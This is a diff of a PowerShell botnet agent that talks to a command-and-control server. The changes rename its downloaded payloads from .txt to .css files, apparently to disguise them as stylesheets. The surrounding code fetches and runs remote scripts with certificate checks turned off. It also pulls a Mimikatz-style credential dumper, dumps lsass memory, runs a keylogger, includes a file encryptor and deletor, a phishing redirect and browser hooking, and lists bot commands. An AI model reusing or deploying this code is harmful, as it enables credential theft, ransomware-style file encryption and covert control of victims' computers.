@@ -115,9 +115,9 @@ if ($pshversion -lt 3) {
 	If (Test-Path $exists){		
 		} 
 	else { # check architecture and install version x86 of cl.exe if so
-		if($env:PROCESSOR_ARCHITECTURE -eq "x86"){ $downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl32.txt" }
+		if($env:PROCESSOR_ARCHITECTURE -eq "x86"){ $downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl32.css" }
 		Else{ # install version x64 of cl.exe
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl64.txt" }
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cl64.css" }
 		[string] $FileOnDisk =  "$env:userprofile\AppData\cl.txt"
 		if ($downloadURL.Substring(0,5) -ceq "https") {
 			[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
@@ -484,7 +484,7 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
 			 Write-Verbose "Already present"
 			} else {
 			if($env:PROCESSOR_ARCHITECTURE -eq "x86")
-			{$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx32.txt"}else{$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx64.txt"}
+			{$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx32.css"}else{$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/psx64.css"}
             [string] $FileOnDisk =  "$env:userprofile\log.txt"
             if ($downloadURL.Substring(0,5) -ceq "https") {
                 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
@@ -611,7 +611,7 @@ Function Invoke-Pnt {
 			$result = "Encoded Vector changed to: $myAgntencoded"
 			sendC2 $pc $result $id
             }	
-		Function AutoPilotCommand { # !autotopilot|http://127.0.0.1/www/link/pilot.xml - Used to give a schema to zombies so that they will autopilot. How: they process the .xml file instructions, create and send to C2 the list of pré-formatted commands that they will execute 
+		Function AutoPilotCommand { # !autopilot|http://127.0.0.1/www/link/pilot.xml - Used to give a schema to zombies so that they will autopilot. How: they process the .xml file instructions, create and send to C2 the list of pré-formatted commands that they will execute 
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -1128,7 +1128,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/klog.txt")
 			#md "$env:userprofile\cm"
 			#attrib +h "$env:userprofile\cm"
 			[string] $name = Get-Random -minimum 1 -maximum 9999
-			[string] $downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cm.txt"
+			[string] $downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/cm.css"
             [string] $FileOnDisk =  "$env:userprofile\AppData\cm.txt"
 			(New-Object System.Net.WebClient).DownloadFile($downloadURL,$FileOnDisk)
 			#Convert txt to exe
@@ -1327,7 +1327,7 @@ PsHttp -BINDING "http://127.0.0.1:80" -REDIRECTTO $Redirect_PhishingURL
 			[CmdletBinding()] param( 
 			[string]$id
 			)
-			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/mMktZ.txt"))
+			IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/mmktz.txt"))
 			[string] $rs = "" 
 			$rs += mMktZ -Command "privilege::debug" 
 			$rs += "`n`n "
@@ -1408,7 +1408,7 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 			if (!$process) {  $process="lsass.exe" }
 			if($env:PROCESSOR_ARCHITECTURE -eq "x86")
 			{
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/proc32.txt"
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/proc32.css"
 			[string] $FileOnDisk =  "$env:userprofile\AppData\proc32.txt"
 			if ($downloadURL.Substring(0,5) -ceq "https") {
 				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
@@ -1419,8 +1419,8 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 			attrib +h "$env:userprofile\AppData\proc.exe"
 			}
 		Else{ 
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/proc64.txt"
-			[string] $FileOnDisk =  "$env:userprofile\AppData\proc64.txt"
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/proc64.css"
+			[string] $FileOnDisk =  "$env:userprofile\AppData\proc64.css"
 			if ($downloadURL.Substring(0,5) -ceq "https") {
 				[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
 				}
@@ -2211,7 +2211,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
 			#Cryptor
 			[string] $cypher = $LatestOrder.split('|')[1]
 			[string] $startfolder = $LatestOrder.split('|')[2]
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/aes.txt"
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/aes.css"
             [string] $FileOnDisk =  "$env:userprofile\rec.txt"
             downloadFile $downloadURL $FileOnDisk
 			Invoke-Expression $downloadedScript
@@ -2220,7 +2220,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
 			[System.IO.File]::WriteAllBytes("$env:userprofile\aex.exe", $temp)
 			#attrib +h "$env:userprofile\aex.exe"
 			#Deletor
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/del.txt"
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/del.css"
             [string] $FileOnDisk =  "$env:userprofile\dl.txt"
             downloadFile $downloadURL $FileOnDisk
 			[string]$hex = get-content -path $FileOnDisk
@@ -2258,7 +2258,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
 			#DeCryptor
 			[string] $cypher = $LatestOrder.split('|')[1]
 			[string] $startfolder = $LatestOrder.split('|')[2]
-			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/aes.txt"
+			$downloadURL = "$c2c/ROOT_FOLDER/LINK_FOLDER/aes.css"
             [string] $FileOnDisk =  "$env:userprofile\rec.txt"
             downloadFile $downloadURL $FileOnDisk
 			[string]$hex = get-content -path $FileOnDisk
@@ -2463,7 +2463,7 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
                 !hello {HelloCommand $id}			  #  !hello -  ping c2 server
 				!online {HelloOnline}			  #  !online -  zombie send heartbeat to c2 server
                 !changec2 {ChangeC2Command $id}		  #  !changec2|http:\newc2cserver.com  -  Switch c2 server
-				!autopilot {AutoPilotCommand $id}	  #  !pilot|http://127.0.0.1/www/link/autopilot.xml
+				!autopilot {AutoPilotCommand $id}	  #  !autopilot|http://127.0.0.1/www/link/pilot.xml
 				!vector {EncodedVectorCommand $id}	  #  !vector|SBOFSBOFSBOF== Change the encoded string of payload vector
 				!lock {lockprivCommand $id}           #  !lock  -  This command is used to Pass hand from unprivileged to priveleged shell. When you run a privesc or bypassuac, if it's already PRIV, it doesn't execute. Otherwise, once executed, the shell check if it is PRIV, push !lock command if TRUE and stay locked. Only the NO-PRIV can unlock by putting result to 1 and kill itself to pass hand.
 				!beef {BeefCommand $id}               #  !beef|iexplore.exe|http://192.168.3.40:3000/demos/basic.html   Param 2 can be: firefox.exe/ opera.exe/ chrome.exe/ iexplore.exe
